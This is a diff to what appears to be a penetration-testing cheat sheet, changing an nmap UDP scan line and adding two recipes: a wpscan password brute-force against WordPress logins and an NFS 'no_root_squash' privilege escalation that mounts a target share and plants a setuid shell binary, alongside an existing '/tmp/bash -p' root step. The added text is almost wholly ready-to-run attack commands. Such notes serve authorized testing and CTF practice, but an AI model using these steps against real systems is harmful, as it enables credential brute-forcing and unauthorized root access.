@@ -32,7 +32,7 @@ find out the ip of the machine in the network
             echo "Arguments missing usage: <target_ip> <path to log>"
             exit 0
     fi
-    sudo nmap -Pn --top-ports 1000 -sU --stats-every 3m --max-retries 1 -T3 -oN $2.txt $1
+    sudo nmap -Pn --top-ports 1000 -sU --stats-every 3m --max-retries 1 -T3 -oN $2 $1
 
 *SSH intensive* 
 
@@ -118,6 +118,10 @@ Plugins are having the potential of beeing outdated.
     at - include all themes
     cb - include all coonfig backups
     dbe - database exports
+
+Check WP Logins by dir
+
+    wpscan --url <url> --passwords /location/of/wordlist --usernames <name>
 
 *analysis for vulnerabilities*
 
@@ -1057,6 +1061,22 @@ Get root with python
 When bash shows up
 
     /tmp/bash -p
+
+*NFS Mounting*
+
+it's based on root squash 
+
+    cat /etc/exports
+
+only works if something shows here with "no_root_squash"
+
+    showmount -e <ip>
+    mkdir /tmp/mountme
+    mount -o rw,vers=2 <target_ip>:/<mountable_folder> /tmp/mountme
+
+move over something like shell.c and gcc it + chmod +s it
+
+
  
 **Windows PW Cracking**
 
